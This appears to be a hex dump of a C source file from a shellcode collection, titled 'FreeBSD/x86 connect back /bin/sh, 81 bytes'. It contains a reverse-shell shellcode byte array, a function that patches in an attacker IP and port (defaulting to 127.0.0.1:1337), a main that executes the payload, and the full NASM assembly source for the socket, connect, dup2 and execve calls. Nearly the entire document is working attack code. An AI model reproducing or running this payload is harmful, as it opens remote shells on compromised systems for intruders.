00000000  2f 2a 0d 0a 20 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |/*.. -----------|
00000010  2d 2d 2d 20 46 72 65 65  42 53 44 2f 78 38 36 20  |--- FreeBSD/x86 |
00000020  2d 20 63 6f 6e 6e 65 63  74 20 62 61 63 6b 20 2f  |- connect back /|
00000030  62 69 6e 2f 73 68 2e 20  38 31 20 62 79 74 65 73  |bin/sh. 81 bytes|
00000040  20 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | ---------------|
00000050  2d 0d 0a 20 2a 20 20 41  55 54 48 4f 52 20 3a 20  |-.. *  AUTHOR : |
00000060  54 6f 73 68 0d 0a 20 2a  20 20 20 4f 53 20 20 20  |Tosh.. *   OS   |
00000070  20 3a 20 42 53 44 78 38  36 20 28 54 65 73 74 65  | : BSDx86 (Teste|
00000080  64 20 6f 6e 20 46 72 65  65 42 53 44 20 38 2e 31  |d on FreeBSD 8.1|
00000090  29 0d 0a 20 2a 20 20 20  45 4d 41 49 4c 20 3a 20  |).. *   EMAIL : |
000000a0  74 6f 73 68 40 74 75 78  66 61 6d 69 6c 79 2e 6f  |tosh@tuxfamily.o|
000000b0  72 67 0d 0a 20 2a 2f 0d  0a 0d 0a 23 69 6e 63 6c  |rg.. */....#incl|
000000c0  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 0d 0a 23  |ude <stdio.h>..#|
000000d0  69 6e 63 6c 75 64 65 20  3c 73 74 72 69 6e 67 2e  |include <string.|
000000e0  68 3e 0d 0a 23 69 6e 63  6c 75 64 65 20 3c 61 72  |h>..#include <ar|
000000f0  70 61 2f 69 6e 65 74 2e  68 3e 0d 0a 0d 0a 63 68  |pa/inet.h>....ch|
00000100  61 72 20 73 68 65 6c 6c  63 6f 64 65 20 5b 5d 20  |ar shellcode [] |
00000110  3d 20 22 5c 78 33 31 5c  78 63 30 5c 78 35 30 5c  |= "\x31\xc0\x50\|
00000120  78 36 61 5c 78 30 31 5c  78 36 61 5c 78 30 32 5c  |x6a\x01\x6a\x02\|
00000130  78 62 30 5c 78 36 31 5c  78 35 30 5c 78 63 64 5c  |xb0\x61\x50\xcd\|
00000140  78 38 30 5c 78 38 39 5c  78 63 32 22 0d 0a 20 20  |x80\x89\xc2"..  |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000160  20 20 22 5c 78 36 38 5c  78 37 66 5c 78 30 30 5c  |  "\x68\x7f\x00\|
00000170  78 30 30 5c 78 30 31 5c  78 36 36 5c 78 36 38 5c  |x00\x01\x66\x68\|
00000180  78 30 35 5c 78 33 39 5c  78 36 36 5c 78 36 38 5c  |x05\x39\x66\x68\|
00000190  78 30 31 5c 78 30 32 5c  78 38 39 22 0d 0a 20 20  |x01\x02\x89"..  |
000001a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001b0  20 20 22 5c 78 65 31 5c  78 36 61 5c 78 31 30 5c  |  "\xe1\x6a\x10\|
000001c0  78 35 31 5c 78 35 32 5c  78 33 31 5c 78 63 30 5c  |x51\x52\x31\xc0\|
000001d0  78 62 30 5c 78 36 32 5c  78 35 30 5c 78 63 64 5c  |xb0\x62\x50\xcd\|
000001e0  78 38 30 5c 78 33 31 5c  78 63 39 22 0d 0a 20 20  |x80\x31\xc9"..  |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000200  20 20 22 5c 78 35 31 5c  78 35 32 5c 78 33 31 5c  |  "\x51\x52\x31\|
00000210  78 63 30 5c 78 62 30 5c  78 35 61 5c 78 35 30 5c  |xc0\xb0\x5a\x50\|
00000220  78 63 64 5c 78 38 30 5c  78 66 65 5c 78 63 31 5c  |xcd\x80\xfe\xc1\|
00000230  78 38 30 5c 78 66 39 5c  78 30 33 22 0d 0a 20 20  |x80\xf9\x03"..  |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000250  20 20 22 5c 78 37 35 5c  78 66 30 5c 78 33 31 5c  |  "\x75\xf0\x31\|
00000260  78 63 30 5c 78 35 30 5c  78 36 38 5c 78 32 66 5c  |xc0\x50\x68\x2f\|
00000270  78 32 66 5c 78 37 33 5c  78 36 38 5c 78 36 38 5c  |x2f\x73\x68\x68\|
00000280  78 32 66 5c 78 36 32 5c  78 36 39 22 0d 0a 20 20  |x2f\x62\x69"..  |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002a0  20 20 22 5c 78 36 65 5c  78 38 39 5c 78 65 33 5c  |  "\x6e\x89\xe3\|
000002b0  78 35 30 5c 78 35 34 5c  78 35 33 5c 78 62 30 5c  |x50\x54\x53\xb0\|
000002c0  78 33 62 5c 78 35 30 5c  78 63 64 5c 78 38 30 22  |x3b\x50\xcd\x80"|
000002d0  3b 0d 0a 0d 0a 76 6f 69  64 20 63 68 61 6e 67 65  |;....void change|
000002e0  5f 73 68 65 6c 6c 63 6f  64 65 28 63 6f 6e 73 74  |_shellcode(const|
000002f0  20 63 68 61 72 20 2a 69  70 2c 20 75 6e 73 69 67  | char *ip, unsig|
00000300  6e 65 64 20 73 68 6f 72  74 20 70 6f 72 74 29 0d  |ned short port).|
00000310  0a 7b 0d 0a 20 20 20 2a  28 28 75 6e 73 69 67 6e  |.{..   *((unsign|
00000320  65 64 20 6c 6f 6e 67 2a  29 28 73 68 65 6c 6c 63  |ed long*)(shellc|
00000330  6f 64 65 20 2b 20 31 35  29 29 20 3d 20 69 6e 65  |ode + 15)) = ine|
00000340  74 5f 61 64 64 72 28 69  70 29 3b 0d 0a 20 20 20  |t_addr(ip);..   |
00000350  2a 28 28 75 6e 73 69 67  6e 65 64 20 73 68 6f 72  |*((unsigned shor|
00000360  74 2a 29 28 73 68 65 6c  6c 63 6f 64 65 20 2b 20  |t*)(shellcode + |
00000370  32 31 29 29 20 3d 20 68  74 6f 6e 73 28 70 6f 72  |21)) = htons(por|
00000380  74 29 3b 0d 0a 7d 0d 0a  76 6f 69 64 20 70 72 69  |t);..}..void pri|
00000390  6e 74 5f 73 68 65 6c 6c  63 6f 64 65 28 76 6f 69  |nt_shellcode(voi|
000003a0  64 29 0d 0a 7b 0d 0a 20  20 20 69 6e 74 20 69 3b  |d)..{..   int i;|
000003b0  0d 0a 20 20 20 66 6f 72  28 69 20 3d 20 30 3b 20  |..   for(i = 0; |
000003c0  69 20 3c 20 73 69 7a 65  6f 66 28 73 68 65 6c 6c  |i < sizeof(shell|
000003d0  63 6f 64 65 29 20 2d 20  31 3b 20 69 2b 2b 29 0d  |code) - 1; i++).|
000003e0  0a 20 20 20 7b 0d 0a 20  20 20 20 20 20 70 72 69  |.   {..      pri|
000003f0  6e 74 66 28 22 5c 5c 78  25 2e 32 78 22 2c 20 28  |ntf("\\x%.2x", (|
00000400  75 6e 73 69 67 6e 65 64  20 63 68 61 72 29 73 68  |unsigned char)sh|
00000410  65 6c 6c 63 6f 64 65 5b  69 5d 29 3b 0d 0a 20 20  |ellcode[i]);..  |
00000420  20 7d 0d 0a 20 20 20 70  72 69 6e 74 66 28 22 5c  | }..   printf("\|
00000430  6e 22 29 3b 0d 0a 7d 0d  0a 69 6e 74 20 6d 61 69  |n");..}..int mai|
00000440  6e 28 76 6f 69 64 29 0d  0a 7b 0d 0a 20 20 20 63  |n(void)..{..   c|
00000450  6f 6e 73 74 20 63 68 61  72 20 69 70 5b 5d 20 3d  |onst char ip[] =|
00000460  20 22 31 32 37 2e 30 2e  30 2e 31 22 3b 0d 0a 20  | "127.0.0.1";.. |
00000470  20 20 75 6e 73 69 67 6e  65 64 20 73 68 6f 72 74  |  unsigned short|
00000480  20 70 6f 72 74 20 3d 20  31 33 33 37 3b 0d 0a 0d  | port = 1337;...|
00000490  0a 20 20 20 63 68 61 6e  67 65 5f 73 68 65 6c 6c  |.   change_shell|
000004a0  63 6f 64 65 28 69 70 2c  20 70 6f 72 74 29 3b 0d  |code(ip, port);.|
000004b0  0a 20 20 20 70 72 69 6e  74 5f 73 68 65 6c 6c 63  |.   print_shellc|
000004c0  6f 64 65 28 29 3b 0d 0a  20 20 20 70 72 69 6e 74  |ode();..   print|
000004d0  66 28 22 53 68 65 6c 6c  63 6f 64 65 20 6c 65 6e  |f("Shellcode len|
000004e0  20 3d 20 25 64 20 62 79  74 65 73 5c 6e 22 2c 20  | = %d bytes\n", |
000004f0  73 69 7a 65 6f 66 28 73  68 65 6c 6c 63 6f 64 65  |sizeof(shellcode|
00000500  29 2d 31 29 3b 0d 0a 20  20 20 76 6f 69 64 20 28  |)-1);..   void (|
00000510  2a 66 29 28 29 20 3d 20  28 76 6f 69 64 2a 29 20  |*f)() = (void*) |
00000520  73 68 65 6c 6c 63 6f 64  65 3b 0d 0a 0d 0a 20 20  |shellcode;....  |
00000530  20 66 28 29 3b 0d 0a 0d  0a 20 20 20 72 65 74 75  | f();....   retu|
00000540  72 6e 20 30 3b 0d 0a 7d  0d 0a 0d 0a 2f 2a 0d 0a  |rn 0;..}..../*..|
00000550  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |;;;;;;;;;;;;;;;;|
*
00000580  3b 3b 3b 3b 3b 3b 3b 0d  0a 3b 20 53 79 73 63 61  |;;;;;;;..; Sysca|
00000590  6c 6c 73 20 6e 75 6d 73  2c 20 6f 6e 20 2f 75 73  |lls nums, on /us|
000005a0  72 2f 73 72 63 2f 73 79  73 2f 6b 65 72 6e 2f 73  |r/src/sys/kern/s|
000005b0  79 73 63 61 6c 6c 73 2e  6d 61 73 74 65 72 20 3b  |yscalls.master ;|
000005c0  0d 0a 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |..;;;;;;;;;;;;;;|
000005d0  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |;;;;;;;;;;;;;;;;|
*
000005f0  3b 3b 3b 3b 3b 3b 3b 3b  3b 0d 0a 0d 0a 25 64 65  |;;;;;;;;;....%de|
00000600  66 69 6e 65 20 49 50 50  52 4f 54 4f 5f 54 43 50  |fine IPPROTO_TCP|
00000610  20 36 0d 0a 25 64 65 66  69 6e 65 20 53 4f 43 4b  | 6..%define SOCK|
00000620  5f 53 54 52 45 41 4d 20  31 0d 0a 25 64 65 66 69  |_STREAM 1..%defi|
00000630  6e 65 20 41 46 5f 49 4e  45 54 20 32 0d 0a 0d 0a  |ne AF_INET 2....|
00000640  25 64 65 66 69 6e 65 20  53 59 53 5f 45 58 45 43  |%define SYS_EXEC|
00000650  56 20 35 39 0d 0a 25 64  65 66 69 6e 65 20 53 59  |V 59..%define SY|
00000660  53 5f 44 55 50 32 20 39  30 0d 0a 25 64 65 66 69  |S_DUP2 90..%defi|
00000670  6e 65 20 53 59 53 5f 53  4f 43 4b 45 54 20 39 37  |ne SYS_SOCKET 97|
00000680  0d 0a 25 64 65 66 69 6e  65 20 53 59 53 5f 43 4f  |..%define SYS_CO|
00000690  4e 4e 45 43 54 20 39 38  0d 0a 0d 0a 73 65 63 74  |NNECT 98....sect|
000006a0  69 6f 6e 20 2e 74 65 78  74 0d 0a 0d 0a 67 6c 6f  |ion .text....glo|
000006b0  62 61 6c 20 5f 73 74 61  72 74 0d 0a 0d 0a 5f 73  |bal _start...._s|
000006c0  74 61 72 74 3a 0d 0a 20  20 20 78 6f 72 20 65 61  |tart:..   xor ea|
000006d0  78 2c 20 65 61 78 0d 0a  20 20 20 3b 3b 3b 3b 3b  |x, eax..   ;;;;;|
000006e0  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |;;;;;;;;;;;;;;;;|
000006f0  3b 0d 0a 20 20 20 3b 20  73 6f 63 6b 65 74 28 29  |;..   ; socket()|
00000700  0d 0a 20 20 20 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |..   ;;;;;;;;;;;|
00000710  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 0d 0a 20 20 20  |;;;;;;;;;;;..   |
00000720  70 75 73 68 20 65 61 78  0d 0a 20 20 20 70 75 73  |push eax..   pus|
00000730  68 20 62 79 74 65 20 53  4f 43 4b 5f 53 54 52 45  |h byte SOCK_STRE|
00000740  41 4d 0d 0a 20 20 20 70  75 73 68 20 62 79 74 65  |AM..   push byte|
00000750  20 41 46 5f 49 4e 45 54  0d 0a 0d 0a 20 20 20 6d  | AF_INET....   m|
00000760  6f 76 20 61 6c 2c 20 53  59 53 5f 53 4f 43 4b 45  |ov al, SYS_SOCKE|
00000770  54 0d 0a 20 20 20 70 75  73 68 20 65 61 78 0d 0a  |T..   push eax..|
00000780  20 20 20 69 6e 74 20 30  78 38 30 0d 0a 20 20 20  |   int 0x80..   |
00000790  6d 6f 76 20 65 64 78 2c  20 65 61 78 0d 0a 0d 0a  |mov edx, eax....|
000007a0  20 20 20 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |   ;;;;;;;;;;;;;|
000007b0  3b 3b 3b 3b 3b 3b 3b 3b  3b 0d 0a 20 20 20 3b 20  |;;;;;;;;;..   ; |
000007c0  73 6f 63 6b 61 64 64 72  5f 69 6e 0d 0a 20 20 20  |sockaddr_in..   |
000007d0  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |;;;;;;;;;;;;;;;;|
000007e0  3b 3b 3b 3b 3b 3b 0d 0a  20 20 20 70 75 73 68 20  |;;;;;;..   push |
000007f0  30 78 30 31 30 30 30 30  37 66 0d 0a 20 20 20 70  |0x0100007f..   p|
00000800  75 73 68 20 77 6f 72 64  20 30 78 33 39 30 35 0d  |ush word 0x3905.|
00000810  0a 20 20 20 70 75 73 68  20 77 6f 72 64 20 30 78  |.   push word 0x|
00000820  30 32 30 31 0d 0a 20 20  20 6d 6f 76 20 65 63 78  |0201..   mov ecx|
00000830  2c 20 65 73 70 0d 0a 0d  0a 20 20 20 3b 3b 3b 3b  |, esp....   ;;;;|
00000840  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |;;;;;;;;;;;;;;;;|
00000850  3b 0d 0a 20 20 20 3b 20  63 6f 6e 6e 65 63 74 28  |;..   ; connect(|
00000860  29 0d 0a 20 20 20 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |)..   ;;;;;;;;;;|
00000870  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 0d 0a 20 20 20  |;;;;;;;;;;;..   |
00000880  70 75 73 68 20 62 79 74  65 20 31 36 0d 0a 20 20  |push byte 16..  |
00000890  20 70 75 73 68 20 65 63  78 0d 0a 20 20 20 70 75  | push ecx..   pu|
000008a0  73 68 20 65 64 78 0d 0a  20 20 20 78 6f 72 20 65  |sh edx..   xor e|
000008b0  61 78 2c 20 65 61 78 0d  0a 20 20 20 6d 6f 76 20  |ax, eax..   mov |
000008c0  61 6c 2c 20 53 59 53 5f  43 4f 4e 4e 45 43 54 0d  |al, SYS_CONNECT.|
000008d0  0a 20 20 20 70 75 73 68  20 65 61 78 0d 0a 20 20  |.   push eax..  |
000008e0  20 69 6e 74 20 30 78 38  30 0d 0a 0d 0a 20 20 20  | int 0x80....   |
000008f0  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |;;;;;;;;;;;;;;;;|
00000900  3b 3b 3b 3b 3b 0d 0a 20  20 20 3b 20 64 75 70 32  |;;;;;..   ; dup2|
00000910  28 29 0d 0a 20 20 20 3b  3b 3b 3b 3b 3b 3b 3b 3b  |()..   ;;;;;;;;;|
00000920  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 0d 0a 20 20  |;;;;;;;;;;;;..  |
00000930  20 78 6f 72 20 65 63 78  2c 20 65 63 78 0d 0a 2e  | xor ecx, ecx...|
00000940  4c 3a 0d 0a 20 20 20 70  75 73 68 20 65 63 78 0d  |L:..   push ecx.|
00000950  0a 20 20 20 70 75 73 68  20 65 64 78 0d 0a 20 20  |.   push edx..  |
00000960  20 78 6f 72 20 65 61 78  2c 20 65 61 78 0d 0a 20  | xor eax, eax.. |
00000970  20 20 6d 6f 76 20 61 6c  2c 20 53 59 53 5f 44 55  |  mov al, SYS_DU|
00000980  50 32 0d 0a 20 20 20 70  75 73 68 20 65 61 78 0d  |P2..   push eax.|
00000990  0a 20 20 20 69 6e 74 20  30 78 38 30 0d 0a 0d 0a  |.   int 0x80....|
000009a0  20 20 20 69 6e 63 20 63  6c 0d 0a 20 20 20 63 6d  |   inc cl..   cm|
000009b0  70 20 63 6c 2c 20 33 0d  0a 20 20 20 6a 6e 65 20  |p cl, 3..   jne |
000009c0  2e 4c 0d 0a 0d 0a 20 20  20 3b 3b 3b 3b 3b 3b 3b  |.L....   ;;;;;;;|
000009d0  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 0d  |;;;;;;;;;;;;;;;.|
000009e0  0a 20 20 20 3b 20 65 78  65 63 76 28 22 2f 62 69  |.   ; execv("/bi|
000009f0  6e 2f 73 68 22 29 0d 0a  20 20 20 3b 3b 3b 3b 3b  |n/sh")..   ;;;;;|
00000a00  3b 3b 3b 3b 3b 3b 3b 3b  3b 3b 3b 3b 3b 3b 3b 3b  |;;;;;;;;;;;;;;;;|
00000a10  3b 0d 0a 20 20 20 78 6f  72 20 65 61 78 2c 20 65  |;..   xor eax, e|
00000a20  61 78 0d 0a 0d 0a 20 20  20 70 75 73 68 20 65 61  |ax....   push ea|
00000a30  78 0d 0a 0d 0a 20 20 20  70 75 73 68 20 27 2f 2f  |x....   push '//|
00000a40  73 68 27 0d 0a 20 20 20  70 75 73 68 20 27 2f 62  |sh'..   push '/b|
00000a50  69 6e 27 0d 0a 0d 0a 20  20 20 6d 6f 76 20 65 62  |in'....   mov eb|
00000a60  78 2c 20 65 73 70 0d 0a  0d 0a 20 20 20 70 75 73  |x, esp....   pus|
00000a70  68 20 65 61 78 0d 0a 20  20 20 70 75 73 68 20 65  |h eax..   push e|
00000a80  73 70 0d 0a 20 20 20 70  75 73 68 20 65 62 78 0d  |sp..   push ebx.|
00000a90  0a 20 20 20 6d 6f 76 20  61 6c 2c 20 53 59 53 5f  |.   mov al, SYS_|
00000aa0  45 58 45 43 56 0d 0a 20  20 20 70 75 73 68 20 65  |EXECV..   push e|
00000ab0  61 78 0d 0a 20 20 20 69  6e 74 20 30 78 38 30 0d  |ax..   int 0x80.|
00000ac0  0a 20 2a 2f                                       |. */|
00000ac4
